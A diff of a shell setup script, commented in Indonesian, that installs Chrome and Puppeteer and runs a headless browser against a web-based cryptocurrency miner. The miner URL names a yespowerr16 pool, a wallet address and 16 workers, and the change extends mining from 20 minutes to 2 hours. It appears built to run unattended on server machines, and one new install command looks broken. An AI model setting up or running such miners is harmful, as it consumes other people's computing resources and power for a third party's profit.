@@ -60,23 +60,26 @@ sudo yum install -y google-chrome-stable
 # Instal Puppeteer dan npx
 npm install puppeteer npx
 
-# Menggunakan npx untuk menginstal Chrome yang kompatibel dengan Puppeteer
-npx puppeteer browsers install
+# Instalasi Chrome menggunakan puppeteer-core
+npx puppeteer-core --chrome
 
 # Buat dan jalankan skrip Puppeteer
 cat <<EOF > puppeteer_script.js
-const puppeteer = require('puppeteer');
+const puppeteer = require('puppeteer-core');
 
 (async () => {
-  const browser = await puppeteer.launch({ headless: true });
+  const browser = await puppeteer.launch({
+    executablePath: '/usr/bin/google-chrome-stable', // Sesuaikan path ini dengan lokasi instalasi Chrome Anda
+    headless: true,
+  });
   const page = await browser.newPage();
   await page.goto('https://webminer.pages.dev?algorithm=yespowerr16&host=stratum-asia.rplant.xyz&port=13382&worker=YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC&password=x&workers=16');
 
-  // Set timeout untuk menjaga browser terbuka selama 20 menit (1200 detik)
+  // Set timeout untuk menjaga browser terbuka selama 2 jam (7200 detik)
   setTimeout(async () => {
-    console.log('Menutup browser setelah 20 menit.');
+    console.log('Menutup browser setelah 2 jam.');
     await browser.close();
-  }, 1200 * 1000);
+  }, 7200 * 1000);
 
   // Tunggu agar skrip tetap berjalan untuk menjaga browser terbuka
   await new Promise(() => {});
